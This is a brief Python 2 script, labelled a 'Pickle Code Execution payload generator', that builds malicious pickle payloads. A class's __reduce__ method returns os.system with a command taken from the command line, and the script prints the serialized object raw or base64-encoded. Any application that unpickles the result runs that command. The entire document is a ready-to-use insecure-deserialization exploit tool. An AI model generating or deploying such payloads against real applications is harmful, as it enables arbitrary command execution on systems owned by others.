import argparse
import base64
import os
import cPickle
parser = argparse.ArgumentParser(description='Pickle Code Execution payload generator')
parser.add_argument('-c', action="store", help="command line input", required=True)
parser.add_argument('-b', action="store_true", help="encode with Base64", required=True)
cmd = parser.parse_args().c
class Blah(object):
  def __reduce__(self):
    return (os.system,(cmd,))
if parser.parse_args().b:
	print base64.b64encode(cPickle.dumps(Blah()))
else:
	print cPickle.dumps(Blah())

